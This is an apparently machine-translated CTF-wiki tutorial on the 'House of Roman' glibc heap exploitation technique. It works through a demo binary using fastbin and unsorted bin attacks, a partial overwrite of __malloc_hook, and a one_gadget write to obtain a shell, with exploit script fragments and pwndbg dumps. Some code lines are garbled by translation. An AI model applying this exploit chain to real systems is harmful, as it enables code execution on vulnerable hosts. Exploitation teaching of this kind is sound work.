[EN](./house_of_roman.md) | [ZH](./house_of_roman-zh.md)




# House of Roman



## Introduction


House of Roman This trick is simply a small trick combined with fastbin attack and Unsortbin attack.


## Summary






This technique is used for bypass ALSR, which uses a 12-bit burst to achieve the shell. It can be exploited with just one UAF vulnerability and the ability to create chunks of any size.






## Principle and display






The author provided us with a demo for display, and the entire process can be divided into three steps.


1. Point FD to malloc_hook
2. Fix 0x71 Freelist
3. Write one gadget to malloc_hook






First a rough analysis of the demo:


Open protection:


```bash

[*] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      PIE enabled

```



There are three main functions in the sample question, Malloc, Write, and Free.


```c

    switch ( v4 )

    {

      case 1:

        puts("Malloc");

        v5 = malloc_chunk("Malloc");

        if ( !v5 )

          puts("Error");

        break;

      case 2:

        puts("Write");

        write_chunk("Write");

        break;

      case 3:

        puts("Free");

        free_chunk();

        break;

      default:

        puts("Invalid choice");

        break;

```



In the Free function, there is a dangling pointer caused by the pointer not being zeroed.


```c

void free_chunk()

{

  unsigned int v0; // [rsp+Ch] [rbp-4h]@1



printf (&quot;Next index:&quot;);
  __isoc99_scanf("%d", &v0);

  if ( v0 <= 0x13 )

    free(heap_ptrs[(unsigned __int64)v0]);

}

```







### First step


First fake a chunk, the size of the chunk is 0x61. Then we use partial overwrite to point the FD to the forged chunk (of course, we can also do this with UAF).


Forged chunk size


```bash

pwndbg&gt;
0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141

0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141

0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141

0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141

0x555555757090: 0x41414141      0x41414141      0x61    0x0     <----------

```



Here, we are free of chunk 1, this time we can get an unsortbin


```

0x555555757020 PREV_INUSE {

  prev_size = 0x0,

  size = 0xd1,

fd = 0x7ffff7dd1b58 <main_arena+88> ,
bk = 0x7ffff7dd1b58 <main_arena+88> ,
  fd_nextsize = 0x4141414141414141,

bk_nextsize = 0x4141414141414141
}

```



Next, we redistribute the chunk 0xd1 and modify its size to 0x71.


```

pwndbg> x/40ag 0x555555757020

0x555555757020: 0x4141414141414141      0x71

0x555555757030: 0x7ffff7dd1b58 <main_arena+88>  0x7ffff7dd1b58 <main_arena+88>

0x555555757040: 0x4141414141414141      0x4141414141414141

0x555555757050: 0x4141414141414141      0x4141414141414141

0x555555757060: 0x4141414141414141      0x4141414141414141

0x555555757070: 0x4141414141414141      0x4141414141414141

0x555555757080: 0x4141414141414141      0x4141414141414141

0x555555757090: 0x4141414141414141      0x61

```







We then need to fix this 0x71 FD freelist and fake it as a block that has already been released.

```

pwndbg> x/40ag 0x555555757000

0x555555757000: 0x0     0x21

0x555555757010: 0x4141414141414141      0x4141414141414141

0x555555757020: 0x4141414141414141      0x71       <----------  free 0x71

0x555555757030: 0x7ffff7dd1b58 <main_arena+88>  0x7ffff7dd1b58 <main_arena+88>

0x555555757040: 0x4141414141414141      0x4141414141414141

0x555555757050: 0x4141414141414141      0x4141414141414141

0x555555757060: 0x4141414141414141      0x4141414141414141

0x555555757070: 0x4141414141414141      0x4141414141414141

0x555555757080: 0x4141414141414141      0x4141414141414141

0x555555757090: 0x4141414141414141      0x61

0x5555557570a0: 0x0     0x0

0x5555557570b0: 0x0     0x0

0x5555557570c0: 0x0     0x0

0x5555557570d0: 0x0     0x0

0x5555557570e0: 0x0     0x0

0x5555557570f0: 0xd0    0x71   <----------     free 0x71

0x555555757100: 0x0     0x0

0x555555757110: 0x0     0x0

0x555555757120: 0x0     0x0

0x555555757130: 0x0     0x0



```







```

libc : 0x7ffff7a23d28 ("malloc_hook")

```



At this time our FD is already near the malloc hook and is not ready for blasting.


### 第二步


We only need to release the fix by releasing a chunk of size 0x71.






### third step


Take advantage of unsortebin&#39;s attacking techniques and use the editing function to write onegadet.






##分析exp






Assign `3` `chunk`, set `p64(0x61)` at `B + 0x78`, the function is `fake size` for the following `fastbin attack`






```python

create(0x18,0) # 0x20

create(0xc8,1) # d0

create(0x65,2)  # 0x70



info("create 2 chunk, 0x20, 0xd8")

fake = "A"*0x68

fake += p64(0x61)  ## fake size

edit(1,fake)

info("fake")

```



Release `B` and assign the same size again to `B`, where `B+0x10` and `B+0x18` have the address of `main_arean`. Assign `3` `fastbin` and `off by one` to modify `B-&gt;size = 0x71`


```

free(1)

create(0xc8,1)



create(0x65,3)  # b

create(0x65,15)

create(0x65,18)



over = "A"*0x18  # off by one

over += "\x71"  # set chunk  1's size --> 0x71

edit(0,over)

info("利用 off by one ,  chunk  1's size --> 0x71")

```



Generate two `fastbin`s, then use `uaf` to write some addresses and chain `B` to `fastbin`


 



```py

free(2)

free(3)

Info(&quot;Create two 0x70 fastbin&quot;)
heap_po = "\x20"

edit (3, heap_po)
Info(&quot;Link chunk&#39;1 into fastbin&quot;)


```



Debug to see the status of `fastbin` at this time


 



```

pwndbg> fastbins 

fastbins

0x20: 0x0

0x30: 0x0

0x40: 0x0

0x50: 0x0

0x60: 0x0

0x70: 0x555555757160 —▸ 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x7ffff7dd1b78

0x80: 0x0

```



&gt; `0x555555757020` is `chunk B`


Then by modifying the low `2` bytes of `B-&gt;fd`, make `B-&gt;fd= malloc_hook - 0x23`


 



```

# malloc_hook above
malloc_hook_nearly = "\xed\x1a"

edit(1,malloc_hook_nearly)

Info(&quot;Partial write, modify fastbin-&gt;fd ---&gt; malloc_hook&quot;)


```



Then allocate `3` ``xk` of `0x70`, and you can get the `chunk` where `malloc_hook` is located.

 



```

create(0x65,0)

create(0x65,0)

create(0x65,0)

```



Then `free` drop `E`, enter `fastbin`, use `uaf` to set `E-&gt;fd = 0`, fix `fastbin`


```

free(15)

edit(15,p64(0x00))

Info(&quot;Generate 0x71 fastbin again, modify fd =0, fix fastbin&quot;)
```



Then an unsorted bin attack, making the value of malloc_hook main_arena+88


 



```

create(0xc8,1)

create(0xc8,1)

create(0x18,2)

create(0xc8,3)

create(0xc8,4)

free(1)

po = &quot;B&quot; * 8
po + = &quot;\ x00 \ x1b&quot;
edit (1, po)
create(0xc8,1)

Info(&quot;unsorted bin makes malloc_hook have the address of libc&quot;)
```



Make the `malloc_hook` address of `one_gadget` by modifying the lower three bytes of `malloc_hook`


 



```

over = "R"*0x13   # padding for malloc_hook

over + = &quot;\ xa4 \ xd2 \ xaf&quot;
edit(0,over)



info("malloc_hook to one_gadget")

```



Then `free` twice with the same `chunk`, trigger `malloc_printerr` , `getshell`


 



```

free(18)

free(18)

```







## link



https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc



https://github.com/romanking98/House-Of-Roman



https://xz.aliyun.com/t/2316
